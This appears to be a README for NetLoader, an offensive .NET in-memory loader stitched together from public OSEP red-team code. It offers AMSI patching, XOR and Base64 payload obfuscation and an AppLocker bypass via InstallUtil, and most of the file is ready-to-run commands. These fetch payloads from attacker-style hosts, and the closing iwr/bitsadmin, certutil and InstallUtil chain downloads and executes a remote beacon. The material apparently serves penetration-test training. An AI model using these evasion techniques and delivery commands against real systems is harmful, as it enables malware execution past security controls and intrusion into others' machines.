# NetLoader
NetLoader mixed with AppLocker Bypass PowerShell Runspace.

Source code from:
- <https://github.com/Flangvik/NetLoader/tree/5a58cce49d07d1165a1768f46d85e449c4fc8503>
- <https://github.com/r4ulcl/Mythic-OSEP-CheatSheet/blob/main/scripts/utils/NetLoaderModified.cs>
- <https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/AppLocker%20Bypass%20PowerShell%20Runspace>

## Features
**Core Features:**
-    **AMSI Bypass**: Patches AMSI (Anti-Malware Scan Interface) in memory to evade detection
-    **Dynamic API Resolution**: Resolves Windows API functions at runtime using PE header parsing (no P/Invoke)
-    **Multiple Payload Sources**: Loads executables from both local filesystem and HTTP/HTTPS URLs
-    **Payload Execution**: Loads and executes .NET assemblies in memory (reflective loading)
-    **TLS Configuration**: Automatically sets appropriate TLS protocols for secure downloads

**Evasion & Obfuscation:**
-    **XOR Encryption/Decryption**: Symmetric encryption for payloads using configurable keys
-    **Base64 Encoding Support**: Optional Base64 encoding for all parameters and payload data
-    **No Hardcoded Imports**: All Windows APIs resolved dynamically to avoid static analysis detection
-    **InstallUtil Bypass**: Uses .NET Installer class for execution via legitimate Windows utility

**Debug & Diagnostic Features:**
-    **Verbose Debug Mode**: Detailed logging with timestamps, memory addresses, and data inspection
-    **Hex Dump Capability**: Visual inspection of binary data in debug mode
-    **Error Handling**: Comprehensive exception handling with stack traces in debug mode
-    **Progress Tracking**: Step-by-step execution logging for troubleshooting

**Parameter Support:**
-    `/debug` - Enable detailed debug logging
-    `/b64` - Treat all parameters as Base64 encoded
-    `/xor=<key>` - XOR decryption key for encrypted payloads
-    `/path=<path>` - Local file path or URL to payload
-    `/args=<list>` - Comma-separated arguments for the payload

## Usage
Basic Examples:
```powershell
# Execute local binary
NetLoader.exe /path=C:\tools\payload.exe

# Download and execute from URL
InstallUtil.exe /path=http://attacker.com/payload.exe

# With arguments for payload
NetLoader.exe /path=payload.exe /args="arg1,arg2,arg3"
```
Evasion Examples:
```powershell
# XOR encrypted payload
NetLoader.exe /xor=MySecretKey123 /path=encrypted.bin

# Base64 encoded parameters
NetLoader.exe /b64 /xor=U2VjcmV0S2V5 /path=aHR0cDovL2V4YW1wbGUuY29tL3A=

# Debug mode with XOR encryption
NetLoader.exe /debug /xor=Password123 /path=http://server/encrypted.exe
```
Advanced Examples:
```powershell
# Full evasion chain: Base64 + XOR + URL
NetLoader.exe /b64 /xor=S2V5 /path=aHR0cHM6Ly9zZXJ2ZXIvcGF5bG9hZC5lbmM= /args=YXJnMSx5ZWFo

# Local file with debug and XOR
NetLoader.exe /debug /xor=0xDEADBEEF /path=malware.enc

# HTTPS download with arguments
NetLoader.exe /path=https://cdn.com/tool.exe /args="mode=stealth,target=192.168.1.10"
```
Real-World Scenarios:
```powershell
# Red Team OPSEC: Encrypted download with debug
NetLoader.exe /debug /xor=OpSecKey2024 /path=https://drop-server.com/stage2.enc

# Penetration Test: Local execution with arguments
NetLoader.exe /path=SharpHound.exe /args="--CollectionMethod All --Domain corp.local"

# Malware Analysis: Debug mode to trace execution
NetLoader.exe /debug /path=suspicious.bin /args="analyze,log,report"
```

## OSEP-like execution

The file is compilled with:
```powershell
. 'C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\Roslyn\csc.exe' /t:exe /out:NL-mod.exe /platform:x64 /r:"C:\windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" .\NetLoader-mod.cs
```
> [!NOTE]
> Change `/platform:x86` for x86 architecture.

And encoded with certutil.
```powershell
Certutil -encode NL-mod.exe nl.enc
```
*Note: Save the encoded file in `./Tools/NetLoader/nl.enc`.*

Finally executed with
```powershell
powershell iwr -uri http://192.168.235.130:8000/Tools/NetLoader/nl.enc -outfile C:\\windows\\Tasks\\nl.enc; powershell rm C:\\windows\\Tasks\\vns.exe; powershell certutil -decode C:\\windows\\Tasks\\nl.enc C:\\windows\\Tasks\\vns.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /path=http://192.168.235.130:8000/beacon.exe /U C:\\windows\\Tasks\\vns.exe
```
Or with `bitsadmin`
```powershell
bitsadmin /Transfer myJob http://192.168.235.130:8000/Tools/NetLoader/nl.enc C:\\windows\\Tasks\\nl.enc; powershell rm C:\\windows\\Tasks\\vns.exe; powershell certutil -decode C:\\windows\\Tasks\\nl.enc C:\\windows\\Tasks\\vns.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /path=http://192.168.235.130:8000/beacon.exe /U C:\\windows\\Tasks\\vns.exe
```
> [!NOTE]
> For `x86` use `C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe`.

